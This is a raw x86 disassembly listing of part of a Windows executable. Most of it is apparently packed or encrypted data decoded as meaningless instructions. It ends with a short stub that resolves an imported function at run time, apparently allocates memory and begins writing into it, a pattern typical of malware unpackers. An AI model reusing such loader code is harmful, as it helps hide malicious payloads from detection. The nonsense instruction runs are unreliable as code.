  414c05:	aad    0xd2
  414c07:	add    eax,0xcf9d2c2b
  414c0c:	push   ds
  414c0d:	iret   
  414c0e:	inc    ebx
  414c0f:	in     eax,0xf1
  414c11:	inc    edi
  414c12:	push   0x139113a2
  414c17:	(bad)  [ebx+0x3b45b81c]
  414c1d:	test   edi,0x8569c045
  414c23:	xchg   ebp,eax
  414c24:	call   0xf295:0xcfe20682
  414c2b:	inc    esi
  414c2c:	imul   ch
  414c2e:	aam    0xd9
  414c30:	sub    eax,0x7e48ee18
  414c35:	fdivr  DWORD PTR [ebp+esi*2+0x27acad18]
  414c3c:	dec    BYTE PTR [eax+0x1fe84e94]
  414c42:	cli    
  414c43:	cld    
  414c44:	xchg   edi,eax
  414c45:	in     eax,0xe4
  414c47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c48:	jle    0x414bed
  414c4a:	(bad)  [edi-0x80]
  414c4d:	or     ch,0xc1
  414c50:	pop    ss
  414c51:	or     esi,DWORD PTR [edx-0x38e3ed5d]
  414c57:	xchg   edx,eax
  414c58:	sub    ecx,ebp
  414c5a:	aas    
  414c5b:	jl     0x414c61
  414c5d:	mov    esp,0x66b5cdcc
  414c62:	mov    ds:0x70426696,al
  414c67:	pushf  
  414c68:	scas   al,BYTE PTR es:[edi]
  414c69:	das    
  414c6a:	push   edi
  414c6b:	push   0x9a5e00f7
  414c70:	mov    esp,0xab0315ad
  414c75:	stos   DWORD PTR es:[edi],eax
  414c76:	sbb    DWORD PTR [edi+0x76],ebx
  414c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c7a:	pop    ebx
  414c7b:	jno    0x414c0e
  414c7d:	jo     0x414cdf
  414c7f:	push   edi
  414c80:	out    0x17,al
  414c82:	sar    DWORD PTR [ecx+edi*4],1
  414c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c86:	xchg   esi,eax
  414c87:	pop    ebx
  414c88:	dec    ebp
  414c89:	test   eax,0x6217602c
  414c8e:	add    al,0x57
  414c90:	add    al,0x33
  414c92:	adc    BYTE PTR [ecx-0x778e8d1c],bh
  414c98:	rcl    BYTE PTR [edi],0x27
  414c9b:	mov    eax,ds:0xfc8b2d9
  414ca0:	dec    esp
  414ca1:	sub    al,0xe
  414ca3:	in     eax,0x1e
  414ca5:	dec    edx
  414ca6:	ror    BYTE PTR [esi+0x11151ac0],0xca
  414cad:	jl     0x414c52
  414caf:	(bad)  
  414cb0:	adc    eax,0x8578eeab
  414cb5:	nop
  414cb6:	mov    al,ds:0x3a3cf7c6
  414cbb:	mov    al,0xcb
  414cbd:	lahf   
  414cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cbf:	push   esp
  414cc0:	clc    
  414cc1:	push   ebx
  414cc2:	xchg   ebp,eax
  414cc3:	outs   dx,DWORD PTR ds:[esi]
  414cc4:	lods   al,BYTE PTR ds:[esi]
  414cc5:	push   cs
  414cc6:	push   es
  414cc7:	jp     0x414d19
  414cc9:	mov    ebp,0xbac85039
  414cce:	push   0xdad744fe
  414cd3:	sbb    esp,DWORD PTR [edi]
  414cd5:	push   0xdb8f7901
  414cda:	mov    esi,0x59a9b34a
  414cdf:	xchg   esp,eax
  414ce0:	add    al,0x1f
  414ce2:	push   ebx
  414ce3:	mov    dh,0xe5
  414ce5:	add    esi,eax
  414ce7:	call   0xfdf8f6fb
  414cec:	retf   0x8af6
  414cef:	int3   
  414cf0:	mov    al,ah
  414cf2:	or     BYTE PTR ds:0x8ef850b0,0x62
  414cf9:	leave  
  414cfa:	jbe    0x414d7a
  414cfc:	inc    ebx
  414cfd:	sbb    DWORD PTR [ecx],edx
  414cff:	mov    bh,0x61
  414d01:	jmp    0xdeba:0x4a15b73
  414d08:	xor    eax,0xcfed8558
  414d0d:	mov    ecx,ecx
  414d0f:	cmp    al,0xce
  414d11:	mov    eax,0x1cd6dea4
  414d16:	pusha  
  414d17:	jns    0x414d37
  414d19:	mov    edi,0xf2012ff1
  414d1e:	fist   WORD PTR [ecx-0x63]
  414d21:	ret    
  414d22:	clc    
  414d23:	mov    ebp,0x34eb3597
  414d28:	inc    ebp
  414d29:	mov    ecx,0xa03cdcca
  414d2e:	mov    eax,DWORD PTR [edx+esi*8+0x5d]
  414d32:	in     al,dx
  414d33:	pop    es
  414d34:	mov    ebp,0x1efee6c9
  414d39:	arpl   WORD PTR [eax+0x5],dx
  414d3c:	xlat   BYTE PTR ds:[ebx]
  414d3d:	adc    BYTE PTR [ebx+ebx*8+0x14],bl
  414d41:	shl    DWORD PTR [esi+0x44],cl
  414d44:	test   BYTE PTR [ebp-0x476bdbb9],ch
  414d4a:	jns    0x414db7
  414d4c:	scas   eax,DWORD PTR es:[edi]
  414d4d:	and    eax,0x1f48e9ad
  414d52:	dec    ecx
  414d53:	fwait
  414d54:	sbb    ebp,DWORD PTR [ebx]
  414d56:	test   al,cl
  414d58:	jge    0x414d74
  414d5a:	mov    esi,0xe33da367
  414d5f:	data16 cld 
  414d61:	mov    edi,0x8cfd568b
  414d66:	scas   eax,DWORD PTR es:[edi]
  414d67:	lahf   
  414d68:	lds    edi,FWORD PTR [edi-0x49]
  414d6b:	xchg   ebx,eax
  414d6c:	add    eax,0xc1af92ac
  414d71:	inc    edx
  414d72:	push   esi
  414d73:	cld    
  414d74:	ss je  0x414d5a
  414d77:	xor    DWORD PTR [ebx],eax
  414d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d7a:	adc    BYTE PTR ds:0x23c5049e,cl
  414d80:	xchg   ah,cl
  414d82:	stos   DWORD PTR es:[edi],eax
  414d83:	xchg   edi,eax
  414d84:	lock (bad) 
  414d86:	test   eax,0xa4792bcc
  414d8b:	inc    esi
  414d8c:	dec    eax
  414d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d8e:	push   esp
  414d8f:	mov    dl,0x55
  414d91:	ds pop bx
  414d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d95:	fsub   QWORD PTR [ebx-0x5c1e5609]
  414d9b:	or     BYTE PTR [ebx-0x67],cl
  414d9e:	loopne 0x414dbf
  414da0:	jns    0x414d45
  414da2:	mov    eax,0x92b438e4
  414da7:	mov    al,0xf6
  414da9:	imul   ebx,DWORD PTR [edx-0x75],0x105a66df
  414db0:	sub    eax,0x3bd03d4b
  414db5:	cdq    
  414db6:	mov    ah,0x41
  414db8:	inc    ebx
  414db9:	stc    
  414dba:	hlt    
  414dbb:	and    eax,0xf1fc10d6
  414dc0:	sti    
  414dc1:	jg     0x414e03
  414dc3:	mov    esi,0xbff041a7
  414dc8:	jbe    0x414d73
  414dca:	inc    edx
  414dcb:	mov    edx,0x50c35cba
  414dd0:	dec    esp
  414dd1:	clc    
  414dd2:	into   
  414dd3:	arpl   WORD PTR [edx],cx
  414dd5:	mov    dl,0x7d
  414dd7:	xchg   edi,eax
  414dd8:	mov    ah,bl
  414dda:	cli    
  414ddb:	xchg   BYTE PTR [ecx-0x4fdaac53],al
  414de1:	jo     0x414d7a
  414de3:	test   al,0x2c
  414de5:	mov    ss,edi
  414de7:	adc    al,0x34
  414de9:	dec    eax
  414dea:	int    0xc8
  414dec:	mov    bl,0xe7
  414dee:	sbb    al,0xdc
  414df0:	pushf  
  414df1:	and    DWORD PTR [edi+0x78],edi
  414df4:	sub    DWORD PTR [ecx],esi
  414df6:	ss mov al,0x16
  414df9:	inc    eax
  414dfa:	push   edi
  414dfb:	add    BYTE PTR [edi+edx*2],al
  414dfe:	nop
  414dff:	out    dx,eax
  414e00:	mov    DWORD PTR [ebx+0x53],0xb213924b
  414e07:	cli    
  414e08:	ror    edi,1
  414e0a:	inc    ebx
  414e0b:	in     al,0x5
  414e0d:	mov    ds:0x5565e1e2,eax
  414e12:	cld    
  414e13:	xchg   ecx,eax
  414e14:	xchg   esi,eax
  414e15:	pusha  
  414e16:	dec    eax
  414e17:	bound  ebx,QWORD PTR [esi+0x12]
  414e1a:	stos   DWORD PTR es:[edi],eax
  414e1b:	mov    ebx,0x664d50d6
  414e20:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e22:	inc    edi
  414e23:	inc    ecx
  414e24:	push   es
  414e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e26:	test   ebx,0x1b5ebc3a
  414e2c:	out    0x28,al
  414e2e:	mov    al,0x98
  414e30:	mov    WORD PTR [ecx],fs
  414e32:	int3   
  414e33:	cmp    DWORD PTR [esi],edx
  414e35:	out    dx,eax
  414e36:	aam    0xb5
  414e38:	mov    ecx,0x4b1af5c8
  414e3d:	xor    BYTE PTR [edx+0x53],ch
  414e40:	push   esp
  414e41:	repz fmul DWORD PTR [ebx+0x77f63b7a]
  414e48:	and    edx,DWORD PTR [eax+0x4b26fdff]
  414e4e:	mov    cl,0x36
  414e50:	daa    
  414e51:	push   eax
  414e52:	pop    es
  414e53:	dec    esp
  414e54:	sub    eax,0x4d763fcf
  414e59:	pop    ecx
  414e5a:	test   al,0x61
  414e5c:	and    BYTE PTR [esi],cl
  414e5e:	fwait
  414e5f:	inc    ebp
  414e60:	mov    eax,ds:0xc8dff65d
  414e65:	sub    al,0x7b
  414e67:	push   edx
  414e68:	sbb    BYTE PTR [ecx-0x19],ah
  414e6b:	addr16 jg 0x414ea4
  414e6e:	call   0xbbf3ace7
  414e73:	mov    ebx,0xb724cce0
  414e78:	cmp    DWORD PTR ds:0xfffcd834,ebp
  414e7e:	call   0xd371:0x2f02ae69
  414e85:	test   BYTE PTR [esi+0x41],0x8e
  414e89:	adc    al,0xbe
  414e8b:	or     bl,BYTE PTR [esi]
  414e8d:	neg    BYTE PTR [eax-0x3d]
  414e90:	mov    ch,0x10
  414e92:	push   cs
  414e93:	in     al,0x7f
  414e95:	dec    ebx
  414e96:	arpl   WORD PTR ds:0xc0cdb4ba,cx
  414e9c:	mov    al,ds:0x20370ea6
  414ea1:	push   0x3589c64f
  414ea6:	jmp    FWORD PTR [esi-0x7a094203]
  414eac:	(bad)  
  414ead:	sub    ebp,DWORD PTR [ebp+0x57c5863a]
  414eb3:	inc    ebp
  414eb4:	pop    esp
  414eb5:	mov    eax,ds:0x61c08c0f
  414eba:	jmp    0x414ec8
  414ebc:	mov    esp,0x3693d0c8
  414ec1:	inc    esp
  414ec2:	nop
  414ec3:	shr    DWORD PTR [ebx+edi*8+0x2a2311a7],0xf2
  414ecb:	cwde   
  414ecc:	push   esi
  414ecd:	jb     0x414ea7
  414ecf:	pop    ds
  414ed0:	nop
  414ed1:	mov    ss,WORD PTR [ebx+0x57c82cbf]
  414ed7:	and    ecx,DWORD PTR [eax]
  414ed9:	and    esp,edx
  414edb:	gs aad 0x7d
  414ede:	mul    BYTE PTR [esi+eax*2+0x427aff96]
  414ee5:	jl     0x414eb0
  414ee7:	mov    ebp,DWORD PTR [ebp-0x76]
  414eea:	adc    cl,ch
  414eec:	and    ebp,DWORD PTR [ebp+0x38]
  414eef:	in     eax,0xb3
  414ef1:	mov    dh,0x10
  414ef3:	mov    esp,0xe2efa89f
  414ef8:	das    
  414ef9:	adc    BYTE PTR [ebx-0x34],dh
  414efc:	stos   BYTE PTR es:[edi],al
  414efd:	sbb    BYTE PTR [esi-0x54],bh
  414f00:	je     0x414e99
  414f02:	xchg   edx,eax
  414f03:	pop    eax
  414f04:	daa    
  414f05:	push   esi
  414f06:	add    eax,0xfe623abb
  414f0b:	fild   DWORD PTR [ebx]
  414f0d:	sub    DWORD PTR [ecx+esi*1],0xedac084c
  414f14:	test   eax,0x35df509d
  414f19:	adc    BYTE PTR ds:0x70c82f5c,dl
  414f1f:	ret    0x771
  414f22:	retf   0xddfd
  414f25:	adc    DWORD PTR [eax],esp
  414f27:	into   
  414f28:	push   edx
  414f29:	sbb    ah,BYTE PTR [ebx+0xb61001c]
  414f2f:	push   ss
  414f30:	pop    ebx
  414f31:	mov    ecx,0x52ff682d
  414f36:	in     al,0xc3
  414f38:	out    dx,al
  414f39:	call   DWORD PTR [ebp+esi*1+0x6a]
  414f3d:	mov    bl,0xbd
  414f3f:	pop    eax
  414f40:	or     eax,0xd038df61
  414f45:	shr    esp,cl
  414f47:	mov    edi,0xa512a5e2
  414f4c:	dec    ebx
  414f4d:	icebp  
  414f4e:	xchg   ebx,eax
  414f4f:	inc    eax
  414f50:	mov    ebx,0xf8f894fe
  414f55:	ins    DWORD PTR es:[edi],dx
  414f56:	stos   BYTE PTR es:[edi],al
  414f57:	call   0x22c11380
  414f5c:	inc    edx
  414f5d:	adc    eax,0x19f40364
  414f62:	addr16 cmp eax,0xed7b4f2a
  414f68:	add    DWORD PTR [edi+eiz*8+0x2e3e6d8b],eax
  414f6f:	xchg   ecx,eax
  414f70:	xchg   BYTE PTR [esi+0xc800bd1],dl
  414f76:	test   eax,0xd8b68901
  414f7b:	inc    ecx
  414f7c:	ins    DWORD PTR es:[edi],dx
  414f7d:	cmp    al,0xb1
  414f7f:	and    al,0x73
  414f81:	fs mov bh,0xd0
  414f84:	(bad)  
  414f85:	adc    edi,DWORD PTR [eax+0x5e0fb90e]
  414f8b:	sti    
  414f8c:	xchg   BYTE PTR [edi-0x776c8843],dl
  414f92:	repnz pusha 
  414f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f95:	rol    DWORD PTR [ecx],cl
  414f97:	lock cli 
  414f99:	rcr    DWORD PTR [esi+0x8b72390],0x71
  414fa0:	and    esi,DWORD PTR [edx]
  414fa2:	fs pop esp
  414fa4:	jle    0x415007
  414fa6:	sbb    eax,0x8f5a5f5
  414fab:	add    BYTE PTR [ebp-0xd5b9606],0x3
  414fb2:	jns    0x415030
  414fb4:	xor    DWORD PTR [ecx],ebp
  414fb6:	jg     0x414fb4
  414fb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb9:	and    eax,0xebbf8fa5
  414fbe:	(bad)  
  414fbf:	inc    BYTE PTR [eax+ebp*1-0x35]
  414fc3:	jns    0x415041
  414fc5:	mov    edi,0x801becd4
  414fca:	mov    ds:0x8fc9c773,al
  414fcf:	jg     0x414ff8
  414fd1:	mov    ds:0x7d9878c7,al
  414fd6:	push   esi
  414fd7:	ss dec ecx
  414fd9:	fsubr  QWORD PTR [esi+0x4d243c81]
  414fdf:	ja     0x414ff9
  414fe1:	pop    ds
  414fe2:	and    eax,0xa5c28fd1
  414fe7:	enter  0x1008,0x32
  414feb:	xor    edx,DWORD PTR [ecx-0x20e4815]
  414ff1:	jb     0x414fb8
  414ff3:	mov    esi,gs
  414ff5:	and    ebp,0x825a4504
  414ffb:	dec    esp
  414ffc:	aaa    
  414ffd:	and    bl,BYTE PTR [esi-0x4a]
  415000:	xor    cl,cl
  415002:	inc    edx
  415003:	jmp    0xfecf6251
  415008:	pop    edi
  415009:	jle    0x415036
  41500b:	data16 (bad) 
  41500d:	jo     0x415022
  41500f:	(bad)  
  415011:	lea    ebp,[edx]
  415013:	repnz xchg al,dh
  415016:	mov    ?,WORD PTR [ebp-0x50]
  415019:	jae    0x41501a
  41501b:	xchg   BYTE PTR [ecx+edx*2],ah
  41501e:	gs add DWORD PTR ss:[ebp+0x49],esp
  415023:	in     al,dx
  415024:	(bad)  
  415025:	xchg   edx,eax
  415026:	inc    esp
  415027:	mov    edx,DWORD PTR [ecx+0x1]
  41502a:	das    
  41502b:	ds adc dl,dh
  41502e:	js     0x41501a
  415030:	icebp  
  415031:	aas    
  415032:	mov    ds:0x66d6541,al
  415037:	cmp    eax,0x28d6b562
  41503c:	push   edx
  41503d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41503e:	xchg   ebx,eax
  41503f:	daa    
  415040:	or     eax,0x8bdbc9aa
  415045:	out    dx,al
  415046:	push   eax
  415047:	dec    eax
  415048:	(bad)  
  415049:	loopne 0x414fd0
  41504b:	jp     0x415061
  41504d:	(bad)  
  41504e:	repz pop DWORD PTR [ebp-0x6d]
  415052:	xchg   ecx,eax
  415053:	push   ebp
  415055:	push   edx
  415056:	jl     0x4150ae
  415058:	jmp    0xbb8ae7f0
  41505d:	bound  edi,QWORD PTR [eax]
  41505f:	or     edx,ebx
  415061:	add    eax,0xaa3ada51
  415066:	ins    DWORD PTR es:[edi],dx
  415067:	push   0x7b5832c4
  41506c:	aad    0xf2
  41506e:	pop    eax
  41506f:	or     eax,0xada916c5
  415074:	add    ah,dl
  415076:	js     0x4150a5
  415078:	mov    ds:0x849ee848,al
  41507d:	enter  0x3ffe,0xf1
  415081:	cmc    
  415082:	lock retf 
  415084:	add    eax,0x2d20c709
  415089:	or     ebx,DWORD PTR [esi+0x25]
  41508c:	das    
  41508d:	retfw  
  41508f:	dec    ebp
  415090:	fistp  DWORD PTR [esi]
  415092:	xchg   esp,eax
  415093:	or     eax,0xb9603562
  415098:	fsub   QWORD PTR [eax]
  41509a:	jg     0x4150cb
  41509c:	daa    
  41509d:	jno    0x415075
  41509f:	int3   
  4150a0:	and    eax,DWORD PTR [edx-0x7c3648fe]
  4150a6:	fisub  WORD PTR [eax]
  4150a8:	into   
  4150a9:	mov    BYTE PTR [bp+di+0x35],dh
  4150ad:	aas    
  4150ae:	push   ecx
  4150af:	ror    BYTE PTR [eax+0x30b09ba8],1
  4150b5:	(bad)  
  4150b6:	js     0x41504d
  4150b8:	jo     0x415093
  4150ba:	mov    edx,0x514d8138
  4150bf:	jno    0x41505b
  4150c1:	mov    dh,0xae
  4150c3:	in     eax,0x54
  4150c5:	enter  0xfde9,0xa5
  4150c9:	xchg   edx,eax
  4150ca:	adc    eax,DWORD PTR [edx-0x7c846f7c]
  4150d0:	xchg   esi,eax
  4150d1:	(bad)  [ecx-0x54363a91]
  4150d7:	das    
  4150d8:	sti    
  4150d9:	or     BYTE PTR [ebx],bl
  4150db:	call   0x3b98:0x9930ac09
  4150e2:	rcl    DWORD PTR [edi+0x137ca249],0xe1
  4150e9:	xlat   BYTE PTR ds:[ebx]
  4150ea:	jb     0x415137
  4150ec:	test   al,0x28
  4150ee:	fcomp  DWORD PTR [ebp-0x459a9b6b]
  4150f4:	pop    edx
  4150f5:	jge    0x415149
  4150f7:	test   eax,0x62ce69ab
  4150fc:	scas   eax,DWORD PTR es:[edi]
  4150fd:	jae    0x415144
  4150ff:	das    
  415100:	dec    ecx
  415101:	imul   esp,ebx,0x47
  415104:	mov    ebx,0x14b026e3
  415109:	outs   dx,BYTE PTR ds:[esi]
  41510a:	jne    0x4150f7
  41510c:	aam    0x55
  41510e:	push   edx
  41510f:	outs   dx,BYTE PTR ds:[esi]
  415110:	mov    ds:0x70ed2d4,al
  415115:	xor    al,0xb8
  415117:	nop
  415118:	pop    edx
  415119:	inc    al
  41511b:	jne    0x4150a2
  41511d:	aad    0x8b
  41511f:	mov    WORD PTR [esi+0x5932faac],ss
  415125:	sub    ebp,DWORD PTR [ecx+eiz*2]
  415128:	inc    edx
  415129:	scas   eax,DWORD PTR es:[edi]
  41512a:	or     dl,dh
  41512c:	jnp    0x41512c
  41512e:	xchg   ecx,eax
  41512f:	in     eax,0x77
  415131:	cmp    ch,ah
  415133:	bound  edi,QWORD PTR [ecx-0x49]
  415136:	push   eax
  415137:	push   esp
  415138:	jns    0x415114
  41513a:	fdivr  st,st(0)
  41513c:	(bad)  
  41513e:	cmp    eax,0xb3a50fb1
  415143:	xchg   esi,eax
  415144:	and    dl,dl
  415146:	icebp  
  415147:	xchg   DWORD PTR [esi+0x66],ebx
  41514a:	icebp  
  41514b:	inc    ebp
  41514c:	xchg   edi,eax
  41514d:	adc    ecx,DWORD PTR [edi-0x4bebc880]
  415153:	sub    esi,DWORD PTR [eax*8+0x6332d058]
  41515a:	lahf   
  41515b:	mov    DWORD PTR [edi-0x32],esp
  41515e:	hlt    
  41515f:	pop    ss
  415160:	mov    dl,0x9c
  415162:	aaa    
  415163:	ja     0x4150fd
  415165:	stos   BYTE PTR es:[edi],al
  415166:	mov    eax,ds:0xeac64373
  41516b:	bound  esp,QWORD PTR [ecx+ebx*4-0x6243235]
  415172:	hlt    
  415173:	jb     0x41517e
  415175:	mov    dh,0xa0
  415177:	cmp    cl,dh
  415179:	fild   QWORD PTR [esp+edx*2-0x72]
  41517d:	pop    ebx
  41517e:	shr    BYTE PTR [esi-0x7cebb845],cl
  415184:	dec    edi
  415185:	hlt    
  415186:	call   FWORD PTR [ebx-0xe151bd]
  41518c:	ss mov bl,0xc6
  41518f:	enter  0xb8b5,0x60
  415193:	jg     0x4151fe
  415195:	and    esi,DWORD PTR [edx-0x34]
  415198:	mov    edi,0x65d65939
  41519d:	ret    0xa8ec
  4151a0:	gs jnp 0x415186
  4151a3:	cld    
  4151a4:	mov    BYTE PTR [ecx+ecx*4],ah
  4151a7:	(bad)  
  4151a8:	dec    esi
  4151a9:	adc    cl,bl
  4151ab:	ss scas al,BYTE PTR es:[edi]
  4151ad:	or     eax,ebp
  4151af:	aas    
  4151b0:	xlat   BYTE PTR ds:[ebx]
  4151b1:	or     eax,0x17ffa9c0
  4151b6:	pop    esi
  4151b7:	mov    ecx,0x545285b6
  4151bc:	inc    edx
  4151bd:	mov    dh,0x62
  4151bf:	mov    fs,WORD PTR [ecx]
  4151c1:	xchg   ecx,eax
  4151c2:	jno    0x415165
  4151c4:	xor    dh,ch
  4151c6:	call   0x80728ccb
  4151cb:	jne    0x4151ee
  4151cd:	push   ebp
  4151ce:	in     eax,dx
  4151cf:	xor    BYTE PTR [ecx+0x3505de15],0x53
  4151d6:	call   0x7895:0xbacee7cc
  4151dd:	dec    DWORD PTR fs:[edi+eax*4-0x93272b0]
  4151e5:	mov    DWORD PTR [edx-0x4a],edi
  4151e8:	jl     0x4151e6
  4151ea:	loope  0x41524d
  4151ec:	dec    esi
  4151ed:	fsub   DWORD PTR [ecx]
  4151ef:	xor    cl,BYTE PTR [edx-0x141d9895]
  4151f5:	repnz push ds
  4151f7:	mov    ah,dh
  4151f9:	pop    eax
  4151fa:	mov    esp,0xa1f84c4d
  4151ff:	test   al,0xa0
  415201:	dec    esi
  415202:	push   eax
  415203:	stos   BYTE PTR es:[edi],al
  415204:	sbb    BYTE PTR [esi],al
  415206:	jbe    0x4151f2
  415208:	aad    0x4a
  41520a:	jmp    0x1ac2ea9a
  41520f:	add    eax,0x2205e881
  415214:	out    dx,eax
  415215:	dec    edx
  415216:	dec    eax
  415217:	mov    ecx,0x7cb9557f
  41521c:	pop    ebx
  41521d:	repnz ins BYTE PTR es:[edi],dx
  41521f:	sbb    BYTE PTR [esi-0x3],dh
  415222:	cmp    ebx,esi
  415224:	scas   al,BYTE PTR es:[edi]
  415225:	mov    BYTE PTR [esi-0x5487ad01],0x75
  41522c:	mov    BYTE PTR [ebx],0x84
  41522f:	repz enter 0x7efd,0x4b
  415234:	mov    dh,0x39
  415236:	lds    edx,FWORD PTR [edi]
  415238:	xchg   BYTE PTR [ebp-0x356b34b3],al
  41523e:	test   al,0xad
  415240:	stos   DWORD PTR es:[edi],eax
  415241:	popa   
  415242:	fdivr  QWORD PTR [esi-0x40]
  415245:	xchg   esp,eax
  415246:	inc    esp
  415247:	inc    ebp
  415248:	mov    cl,0x5c
  41524a:	fmul   DWORD PTR [ecx]
  41524c:	sub    al,0x22
  41524e:	clc    
  41524f:	push   ds
  415250:	cmp    bh,bh
  415252:	out    dx,eax
  415253:	cmp    DWORD PTR [esi+0x0],edx
  415256:	mov    ah,0xb6
  415258:	mov    al,0xa3
  41525a:	scas   al,BYTE PTR es:[edi]
  41525b:	cdq    
  41525c:	clc    
  41525d:	push   ecx
  41525e:	and    al,BYTE PTR [edx]
  415260:	imul   ebx,DWORD PTR [esi+eiz*4],0x6a366ee8
  415267:	cmp    BYTE PTR [edx+0x36954afe],dl
  41526d:	cmp    bl,BYTE PTR [eax]
  41526f:	cmp    dl,BYTE PTR [edx+0x64]
  415272:	jg     0x415239
  415274:	push   ss
  415275:	jmp    DWORD PTR [esp+eax*4]
  415278:	push   cs
  415279:	dec    edi
  41527a:	dec    esp
  41527b:	and    BYTE PTR [edx+0x65862f8a],0x6d
  415282:	pusha  
  415283:	jbe    0x41527b
  415285:	pop    ebx
  415286:	icebp  
  415287:	adc    BYTE PTR [esi+0x4f],bh
  41528a:	out    0x73,eax
  41528c:	add    ebp,ebp
  41528e:	outs   dx,DWORD PTR ds:[esi]
  41528f:	gs out 0xa1,al
  415292:	xor    eax,0xbd0c426e
  415297:	mov    ch,0xf7
  415299:	mov    ?,WORD PTR [ebx-0x3f]
  41529c:	int3   
  41529d:	mov    al,0x3e
  41529f:	cmp    bl,al
  4152a1:	adc    edx,DWORD PTR [ecx]
  4152a3:	js     0x4152d0
  4152a5:	arpl   WORD PTR [esi],bp
  4152a7:	mov    ch,0xeb
  4152a9:	icebp  
  4152aa:	aaa    
  4152ab:	repnz aam 0xbe
  4152ae:	cld    
  4152af:	(bad)  
  4152b0:	int    0x1c
  4152b2:	mov    esi,0x5a3da8b8
  4152b7:	shr    BYTE PTR [ebx+0x7a],cl
  4152ba:	stc    
  4152bb:	mov    cl,0xa6
  4152bd:	sbb    ah,ch
  4152bf:	ficom  WORD PTR [esi+edx*8]
  4152c2:	fwait
  4152c3:	daa    
  4152c4:	inc    ebx
  4152c5:	shr    BYTE PTR [ebx-0x2e],0xc6
  4152c9:	addr16 jo 0x415256
  4152cc:	pop    esp
  4152cd:	outs   dx,DWORD PTR ds:[esi]
  4152ce:	mov    BYTE PTR [eax],dh
  4152d0:	test   eax,0x91bca397
  4152d5:	aam    0xdb
  4152d7:	push   0x8dc2c341
  4152dc:	push   ecx
  4152dd:	(bad)  
  4152df:	sub    esp,DWORD PTR [esi+0x58]
  4152e2:	cmc    
  4152e3:	inc    esi
  4152e4:	adc    eax,DWORD PTR [edi+edi*1+0x334ba6ed]
  4152eb:	iret   
  4152ec:	lea    esi,[ebx]
  4152ee:	sahf   
  4152ef:	sub    DWORD PTR [esi-0x5261bc43],edi
  4152f5:	mov    ds:0xdbf7cb6c,eax
  4152fa:	pop    ebp
  4152fb:	out    dx,eax
  4152fc:	repz mov cl,0xd8
  4152ff:	in     eax,dx
  415300:	cmp    ah,al
  415302:	ret    
  415303:	hlt    
  415304:	pop    ecx
  415305:	out    dx,al
  415306:	inc    eax
  415307:	stc    
  415308:	mov    edx,0x6a189b16
  41530d:	push   cs
  41530e:	in     eax,dx
  41530f:	lock or BYTE PTR ds:0x8f274ae5,al
  415316:	mov    dh,0x56
  415318:	jb     0x41534b
  41531a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41531b:	aam    0x0
  41531d:	(bad)  
  41531e:	adc    DWORD PTR [edi+0x79f0c82d],edi
  415324:	dec    esi
  415325:	rcl    BYTE PTR [eax-0x5619476],1
  41532b:	inc    ebx
  41532c:	mov    eax,ds:0xd834a2d6
  415331:	add    ecx,0xbbcb66b1
  415337:	pop    esi
  415338:	in     eax,0x72
  41533a:	push   esi
  41533b:	or     al,0xb7
  41533d:	or     al,0xe8
  41533f:	mov    eax,0x24fb8dd9
  415344:	dec    ebp
  415345:	mov    edx,0x1bdca92b
  41534a:	call   DWORD PTR ds:0x41702c
  415350:	mov    DWORD PTR [ebp-0x2c],eax
  415353:	movzx  edx,WORD PTR [ebp-0x2c]
  415357:	cmp    edx,0x539
  41535d:	jne    0x41538e
  41535f:	mov    DWORD PTR [ebp-0x14],0xe0d
  415366:	lea    eax,[ebp-0x28]
  415369:	push   eax
  41536a:	call   DWORD PTR ds:0x417030
  415370:	mov    DWORD PTR [ebp-0x60],eax
  415373:	mov    DWORD PTR [ebp-0x54],0x3a
  41537a:	mov    BYTE PTR [ebp-0x34],0x0
  41537e:	mov    DWORD PTR [ebp-0x8],0x87cbbdf1
  415385:	mov    DWORD PTR [ebp-0x68],0x10acf7
  41538c:	jmp    0x415395
  41538e:	mov    BYTE PTR ds:0x419f40,0x0
  415395:	push   0x0
  415397:	call   DWORD PTR ds:0x417030
  41539d:	mov    DWORD PTR [ebp-0x2c],eax
  4153a0:	push   DWORD PTR ds:0x417030
  4153a6:	pop    edx
  4153a7:	mov    DWORD PTR [ebp-0x6c],edx
  4153aa:	lea    ecx,[ebp-0x40]
  4153ad:	push   ecx
  4153ae:	mov    edx,DWORD PTR [ebp-0x60]
  4153b1:	push   edx
  4153b2:	call   DWORD PTR ds:0x417038
  4153b8:	mov    DWORD PTR [ebp-0x44],eax
  4153bb:	push   DWORD PTR [ebp-0x30]
  4153be:	push   0x1000
  4153c3:	mov    eax,DWORD PTR [ebp-0x14]
  4153c6:	add    eax,0x23
  4153c9:	add    eax,0x23
  4153cc:	push   eax
  4153cd:	xor    eax,eax
  4153cf:	push   eax
  4153d0:	mov    ecx,DWORD PTR [ebp-0x44]
  4153d3:	call   ecx
  4153d5:	push   eax
  4153d6:	pop    ecx
  4153d7:	mov    DWORD PTR [ebp-0x4],ecx
  4153da:	mov    eax,DWORD PTR [ebp-0x68]
  4153dd:	sub    eax,0xdae0b
  4153e2:	mov    DWORD PTR [ebp-0x68],eax
  4153e5:	cmp    DWORD PTR [ebp-0x4],0x0
  4153e9:	jne    0x415403
  4153eb:	push   0x0
  4153ed:	push   0x0
  4153ef:	call   0x416aac
  4153f4:	push   0x0
  4153f6:	call   DWORD PTR ds:0x417040
  4153fc:	mov    BYTE PTR ds:0x42fed0,0x0
  415403:	mov    ecx,DWORD PTR [ebp-0x4]
  415406:	add    ecx,DWORD PTR [ebp-0x14]
  415409:	mov    edx,DWORD PTR [ebp-0x8]
  41540c:	mov    DWORD PTR [ecx],edx
  41540e:	mov    eax,DWORD PTR [ebp-0x4]
  415411:	add    eax,DWORD PTR [ebp-0x54]
  415414:	mov    DWORD PTR [ebp-0x5c],eax
  415417:	mov    ecx,DWORD PTR ds:0x417038
